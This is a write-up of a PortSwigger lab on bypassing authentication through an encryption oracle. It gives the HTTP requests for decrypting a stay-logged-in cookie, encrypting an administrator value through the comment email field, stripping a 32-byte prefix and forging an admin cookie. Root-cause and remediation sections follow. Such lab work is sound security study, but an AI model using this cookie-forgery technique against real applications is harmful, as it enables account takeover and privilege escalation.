# PortSwigger Lab: Authentication bypass via encryption oracle

# TAGS: Business Logic, Encryption Oracle, Cookie Forgery, Burp Suite

Category: Business Logic
Date: October 27, 2026
Day: Tuesday
Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle
Published: Ready
Status: Done

---

## Intro

This lab is part of the Business Logic series. The flaw is a logic error that exposes an **encryption oracle** and a **decryption oracle** to regular users. The comment form encrypts the email into a `notification` cookie and reflects the decrypted value in the error message — and the same key encrypts the `stay-logged-in` cookie. That lets me decrypt a valid cookie, learn its format, re-encrypt an administrator value and forge my own cookie.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says it contains a logic flaw that exposes an encryption oracle to users. The goal is to gain access to the admin panel and delete the user `carlos`. The lab provides the credentials **wiener:peter**.

I logged in with the **"Stay logged in"** option enabled:

```http
POST /login HTTP/2
Host: 0ab900e30437f98481b5520e00d70006.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<TOKEN>&username=wiener&password=peter&stay-logged-in=on
```

The response set an encrypted `stay-logged-in` cookie:

```text
stay-logged-in=tt9SZaWs7%2bpYmRYwgpXChyNnuJ%2fpBHIwh4uR2%2bsDGn4%3d
```

Then I posted a comment with an **invalid email**:

```http
POST /post/comment HTTP/2
Host: 0ab900e30437f98481b5520e00d70006.web-security-academy.net
Cookie: session=<SESSION>; stay-logged-in=tt9SZaWs7...
Content-Type: application/x-www-form-urlencoded

csrf=<TOKEN>&postId=9&comment=x&name=x&email=invalid&website=http://x
```

```http
HTTP/2 302 Found
Location: /post?postId=9
Set-Cookie: notification=%2fGoUNVMpBMncrJfbuyEGC...; HttpOnly
```

The response also sets an encrypted `notification` cookie, and the blog page reflects my input in clear text:

> Invalid email address: invalid

So the email goes **into** the cookie encrypted, and the cookie comes **out** decrypted in the error — a two-way oracle.

---

## Exploitation:

#### Step 1: Decrypt the stay-logged-in cookie

I sent my `stay-logged-in` value as the `notification` cookie (no session cookie needed):

```http
GET /post?postId=9 HTTP/2
Host: 0ab900e30437f98481b5520e00d70006.web-security-academy.net
Cookie: notification=tt9SZaWs7%2bpYmRYwgpXChyNnuJ%2fpBHIwh4uR2%2bsDGn4%3d
```

The page showed the decrypted value:

```text
wiener:1793151117418
```

So the cookie format is **`username:timestamp`**. I kept the timestamp.

#### Step 2: Encrypt `administrator:<timestamp>`

Next I used the email parameter as an encryption oracle. Because the application prepends the 23-byte string `Invalid email address: `, I added **9 characters** at the start, so the removable prefix becomes exactly **32 bytes** (two 16-byte blocks):

```text
payload: xxxxxxxxxadministrator:1793151117418
```

```http
POST /post/comment HTTP/2
Host: 0ab900e30437f98481b5520e00d70006.web-security-academy.net
Cookie: session=<SESSION>; stay-logged-in=tt9SZaWs7...
Content-Type: application/x-www-form-urlencoded

csrf=<TOKEN>&postId=9&comment=x&name=x&email=xxxxxxxxxadministrator:1793151117418&website=http://x
```

```http
HTTP/2 302 Found
Set-Cookie: notification=%2fGoUNVMpBMncrJfbuyEGCPXq3%2b2WMyi8vAO5y3rEuyZUVlco3c73A1tF%2bkd4idDLS0%2bQl0lFnBHdDqdyH9zkww%3d%3d; HttpOnly
```

#### Step 3: Strip the prefix and forge the cookie

The `notification` value is URL-encoded Base64. I decoded it and removed the first **32 bytes**:

- `Invalid email address: ` = 23 bytes;
- `xxxxxxxxx` = 9 bytes;
- total = 32 bytes (two blocks).

The remaining ciphertext decrypts to exactly `administrator:1793151117418`. Re-encoding it gave me the forged cookie:

```text
VFZXKN3O9wNbRfpHeInQy0tPkJdJRZwR3Q6nch%2Fc5MM%3D
```

#### Step 4: Access the admin panel and delete carlos

I sent a request with the forged cookie and **without** the `session` cookie:

```http
GET / HTTP/2
Host: 0ab900e30437f98481b5520e00d70006.web-security-academy.net
Cookie: stay-logged-in=VFZXKN3O9wNbRfpHeInQy0tPkJdJRZwR3Q6nch%2Fc5MM%3D
```

The application accepted it and logged me in as **administrator**. Then:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0ab900e30437f98481b5520e00d70006.web-security-academy.net
Cookie: stay-logged-in=VFZXKN3O9wNbRfpHeInQy0tPkJdJRZwR3Q6nch%2Fc5MM%3D
```

```http
HTTP/2 302 Found
Location: /admin
```

The lab showed **"Congratulations, you solved the lab!"**.

I automated the whole flow in `scripts/encryption_oracle_bypass.py` (login → decrypt → encrypt → strip 32 bytes → forged cookie → delete carlos).

---

## Root Cause

Three weaknesses combine:

1. The application **encrypts user input and reflects the decrypted result** (`Invalid email address: <email>`), giving users a two-way encryption/decryption oracle.
2. The `stay-logged-in` cookie uses the **same encryption key** and is **not integrity-protected** (no MAC/signature), so a ciphertext produced by the oracle is accepted as a valid cookie.
3. The cookie format is a simple, guessable `username:timestamp`, so after decrypting one cookie I knew exactly what to encrypt.

Because the app even prepends a known 23-byte prefix, the payload can be padded by 9 bytes and the prefix removed in whole blocks, leaving a clean `administrator:<timestamp>` ciphertext.

---

## Impact

An attacker can **forge an authentication cookie for any user**, including the administrator, without knowing any password. In this lab that gave full access to the admin panel and the ability to delete users. In a real application, the same flaw is a complete authentication bypass and privilege escalation — potentially exposing all customer data and administrative actions.

---

## Remediation

To prevent this issue, applications should:

- Use **authenticated encryption** (AEAD, e.g. AES-GCM) and verify the integrity tag before trusting any decrypted value;
- Never expose encryption/decryption oracles to users, and never reflect decrypted user input in error messages;
- Store session/authentication state **server-side** and give clients opaque, random tokens — not encrypted user data;
- Bind cookies to a server-side session and rotate them on privilege changes;
- Treat any client-supplied ciphertext as untrusted input.

---

## Key Takeaways

1. An encryption oracle without integrity protection lets you forge cookies.
2. Error messages that reflect decrypted input are a decryption oracle.
3. The oracle revealed the format (`username:timestamp`) — exactly what was needed to forge an admin cookie.
4. The known 23-byte prefix plus 9 bytes of padding made the prefix removable in whole 16-byte blocks.

---

## References

- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger — Authentication bypass via encryption oracle (lab)](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
- [OWASP — Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
